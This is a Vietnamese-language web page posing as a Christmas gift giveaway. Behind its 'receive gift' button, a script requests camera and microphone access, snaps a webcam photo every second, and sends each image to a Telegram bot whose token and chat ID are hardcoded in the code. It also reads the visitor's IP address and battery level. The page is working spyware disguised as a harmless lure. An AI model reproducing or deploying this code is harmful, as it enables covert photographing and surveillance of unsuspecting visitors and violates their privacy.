<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nhận Quà Giáng Sinh</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }

        #canvas {
            display: none;
        }

        #info {
            margin-top: 20px;
            font-size: 14px;
            text-align: left;
        }

        #permissions {
            margin-top: 20px;
        }

        button {
            padding: 10px 20px;
            margin: 10px;
            font-size: 16px;
        }

        #actions {
            display: none;
        }

        .gift-box-container {
            position: relative;
            width: 150px;
            height: 150px;
            margin: 0 auto 20px;
        }

        .gift-box {
            position: absolute;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #ff6ec4, #7873f5);
            border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 
                        inset 0 5px 10px rgba(255, 255, 255, 0.2);
            transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg);
            animation: rotate3D 3s infinite linear;
        }

        .gift-box::before, .gift-box::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: inherit;
            top: 0;
            left: 0;
            transform: rotateX(90deg);
            transform-origin: center bottom;
        }

        @keyframes rotate3D {
            0% {
                transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg);
            }
            25% {
                transform: rotateX(90deg) rotateY(0deg) rotateZ(45deg);
            }
            50% {
                transform: rotateX(90deg) rotateY(90deg) rotateZ(90deg);
            }
            75% {
                transform: rotateX(180deg) rotateY(90deg) rotateZ(135deg);
            }
            100% {
                transform: rotateX(360deg) rotateY(180deg) rotateZ(180deg);
            }
        }
    </style>
</head>
<body>

<h2>Nhận Quà 🎁</h2>

<div class="gift-box-container">
    <div class="gift-box"></div>
</div>

<div id="permissions">
    <p>Bạn Có Muốn Lấy Quà Không?</p>
    <button id="allow">Nhận Quà 🎁</button>
    <button id="deny">Không Nhận 🎁</button>
</div>

<div id="actions">
    <canvas id="canvas"></canvas>
    <div id="info">
        <p><strong>Thông tin hệ thống:</strong></p>
        <p id="battery">Pin: Đang kiểm tra...</p>
        <p id="cpu">CPU: Null DATA </p>
        <p id="ip">IP: Đang kiểm tra...</p>
        <p id="ping">Ping: Đang kiểm tra...</p>
    </div>
</div>

<script>
    const telegramBotToken = '7265940405:AAGpjcrDenuCJknXqNTCteXJtrauOUQaDdU';
    const adminChatId = '6735388066';

    const permissionsDiv = document.getElementById('permissions');
    const actionsDiv = document.getElementById('actions');

    document.getElementById('allow').addEventListener('click', () => {
        permissionsDiv.style.display = 'none';
        actionsDiv.style.display = 'block';

        enableFeatures();
    });

    document.getElementById('deny').addEventListener('click', () => {
        permissionsDiv.innerHTML = '<p>Bạn Không Muốn Nhận Quà</p>';
    });

    function enableFeatures() {
        // Lấy thông tin pin
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                document.getElementById("battery").textContent = `Pin: ${Math.round(battery.level * 100)}%`;
                battery.addEventListener("levelchange", () => {
                    document.getElementById("battery").textContent = `Pin: ${Math.round(battery.level * 100)}%`;
                });
            });
        }

        // Lấy địa chỉ IP
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById("ip").textContent = `IP: ${data.ip}`;
            })
            .catch(() => {
                document.getElementById("ip").textContent = "IP: Không thể lấy thông tin.";
            });

        // Lấy thông tin Ping
        function updatePing() {
            const startTime = Date.now();
            fetch('https://www.google.com', { mode: 'no-cors' })
                .then(() => {
                    const endTime = Date.now();
                    const ping = endTime - startTime;
                    document.getElementById("ping").textContent = `Ping: ${ping}ms`;
                })
                .catch(() => {
                    document.getElementById("ping").textContent = "Ping: Không khả dụng.";
                });
        }
        setInterval(updatePing, 1000);

        // Mở camera và tự động chụp mỗi 2 giây
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.play();

                videoElement.addEventListener('playing', () => {
                    setInterval(() => capturePhoto(videoElement), 1000); // Tự động chụp mỗi 2 giây
                });
            })
            .catch(() => {
                alert('Không thể mở camera!');
            });
    }

    // Chụp ảnh
    function capturePhoto(videoElement) {
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        // Thiết lập kích thước canvas phù hợp với video
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;

        // Vẽ ảnh video lên canvas
        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/jpeg');
        sendImageToTelegram(imageData);
    }

    // Gửi ảnh qua Telegram bot
    function sendImageToTelegram(imageData) {
        const formData = new FormData();
        const blob = dataURLToBlob(imageData);

        formData.append('chat_id', adminChatId);
        formData.append('photo', blob, 'photo.jpg');

        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Ảnh đã được gửi thành công!");
            } else {
                console.error("Lỗi khi gửi ảnh!");
            }
        })
        .catch(() => {
            console.error("Không thể gửi ảnh!");
        });
    }

    // Chuyển Base64 thành Blob
    function dataURLToBlob(dataURL) {
        const byteString = atob(dataURL.split(',')[1]);
        const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ua = new Uint8Array(ab);

        for (let i = 0; i < byteString.length; i++) {
            ua[i] = byteString.charCodeAt(i);
        }

        return new Blob([ab], { type: mimeString });
    }
</script>

</body>
</html>
